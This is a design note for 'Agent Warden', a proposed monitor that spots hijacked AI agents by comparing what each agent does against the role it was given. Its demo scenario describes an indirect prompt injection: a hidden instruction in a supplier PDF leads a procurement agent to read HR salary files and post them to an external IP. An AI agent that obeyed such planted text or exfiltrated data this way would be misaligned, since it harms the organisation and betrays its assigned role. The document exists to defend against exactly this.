# 01 – Problem Understanding (Simple Version)

## 1. The problem in one paragraph
Companies now give AI agents their own login (token + permissions) so they can work alone. Security tools only check *"is this token valid and allowed?"*. But an agent can be **tricked** (hidden text in a PDF), **poisoned** (a bad tool), or **stolen** (token theft) – and its token is still valid. So the attacker gets an agent that *looks* legitimate but *acts* maliciously. **Nobody is checking whether the agent still behaves like the job it was created for.**

## 2. The analogy (use this in your pitch)
A company hires an **accountant** and gives them a badge for the finance floor.
- Door security checks the badge → ✅ valid.
- A scammer whispers instructions to the accountant. The accountant starts copying HR files and emailing them out.
- Door security still sees a valid badge. **No alarm.**

What's missing is a **manager who knows what the accountant's job is** and notices *"why are you in HR files?"* – that is what we build, for AI agents.

## 3. Why agents are different from humans / normal software

| Normal software | Human employee | AI agent |
|---|---|---|
| Fixed behavior | Slow-changing, accountable | **Decides at runtime** |
| Doesn't read untrusted text | Can spot a scam | **Reads emails/PDFs/web and may obey them** |
| Narrow permissions | Role-bound | **Often over-permissioned** |
| Easy to baseline | Easy to ask | Can be short-lived, new, or chained to other agents |

## 4. The 6 core challenges → what they really mean → what we need

| # | Challenge (from PS) | Plain meaning | What the solution must have |
|---|---|---|---|
| 1 | Valid credentials hide the attack | Permission check can't tell good from hijacked | A check on **behavior vs role**, not on permission |
| 2 | Indirect prompt injection | Evil text hides in normal input | Detect the **effect** (what the agent does after reading), not the text |
| 3 | Legit change vs adversarial drift | Agents legitimately change; don't cry wolf | A way to tell **sanctioned** change from **hijacked** change |
| 4 | Little or no history | New agent = nothing to compare to | **Day-0 detection** from declared role + peer agents |
| 5 | Chains of agents | A→B→C: who is responsible? | **Authority that shrinks along the chain** + contagion tracking |
| 6 | Evasion | Attacker copies normal / goes slowly | **Frozen reference + cumulative capability tracking + hidden tripwires** |

## 5. The hidden requirements (read between the lines of the PS)

1. **"learns the normal behavior"** → need a baseline (statistical).
2. **"compares it with each agent's declared role"** → need a *role specification* that is machine-readable. This is different from just learning from history, because history may already be bad. *Most teams will miss this.*
3. **"explain every alert with a clear risk score"** → explainability is a graded feature, not a nice-to-have. Every alert needs: score, top reasons, evidence, mapped risk category.
4. **"restrict or isolate the agent"** → need an enforcement point (gateway / token service), not only a dashboard.
5. **"without disrupting legitimate work"** → graduated response; measure *false-block rate*.
6. The example attack has **two stages**: (a) read HR files, (b) send to external server. Good detection catches stage (a) or at the latest stage (b) *before data leaves*.

## 6. The example attack, step by step (this becomes our demo)

```
Procurement Agent  (role: check supplier prices, create purchase requests)
 1. Reads supplier_quote.pdf          ← contains hidden instruction (untrusted input)
 2. Calls hr_files.read("salaries")   ← NEW resource class, sensitive, never used by this role
 3. Calls http.post("203.0.113.9")    ← unknown external destination, carries HR data
 Token valid at each step → traditional IAM: ALLOW, ALLOW, ALLOW
```
Agent Warden at each step:
1. Marks context **tainted** (untrusted source ingested).
2. Role-fit violation + taint + sensitive data class → **risk 78 → restrict**: sensitive reads blocked, human approval requested.
3. (If it got here) egress to non-allowlisted host with tainted+sensitive data → **blocked**, risk 96 → **isolate**.

## 7. What "success" looks like (our own measurable definition)

| Metric | Target for prototype |
|---|---|
| Time to detect (steps after hijack starts) | ≤ 1–2 actions |
| Data leaked before containment | 0 bytes of sensitive data outside the org |
| False-block rate on legitimate actions | < 2 % in simulation |
| Cold-start detection (agent with 0 history) | Works from step 1 using role contract |
| Slow-drift detection | Caught before cumulative scope exceeds budget |
| Every alert has | score + top-3 reasons + evidence + OWASP mapping |

## 8. Glossary
- **Identity drift** – an agent's behavior moves away from its declared role while its identity stays valid.
- **Role contract** – machine-readable "job description": allowed tools, data classes, destinations, normal sequences, budgets.
- **Taint / provenance** – a label saying "this data/context came from an untrusted source".
- **Canary / decoy** – a fake resource that no legitimate agent should ever touch; touching it is a near-certain alarm.
- **Blast radius** – how much damage a compromised agent can do with its current permissions.
- **Step-up** – ask a human to approve a risky action instead of blocking outright.
